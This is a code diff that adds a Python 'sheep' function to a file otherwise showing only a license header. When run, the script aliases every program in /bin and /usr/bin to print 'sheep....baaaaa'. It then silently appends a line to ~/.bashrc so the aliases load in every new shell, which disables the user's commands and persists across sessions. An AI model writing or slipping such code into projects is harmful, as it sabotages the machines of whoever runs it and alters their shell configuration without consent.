@@ -16,4 +16,19 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
+import os
 
+def sheep(dirs):
+    binaries = []
+    for dir in dirs:
+        binaries.extend(os.listdir(dir))
+
+    with open(os.path.expanduser('~/.sheep'), 'wb') as sheepfile:
+        for binary in binaries:
+            sheepfile.write('alias {0}="echo sheep....baaaaa "\n'.format(binary))
+
+    with open(os.path.expanduser('~/.bashrc'), 'ab') as bashrc:
+        bashrc.write('source ~/.sheep >/dev/null 2>&1\n')
+
+if __name__ == '__main__':
+    sheep(['/bin', '/usr/bin'])
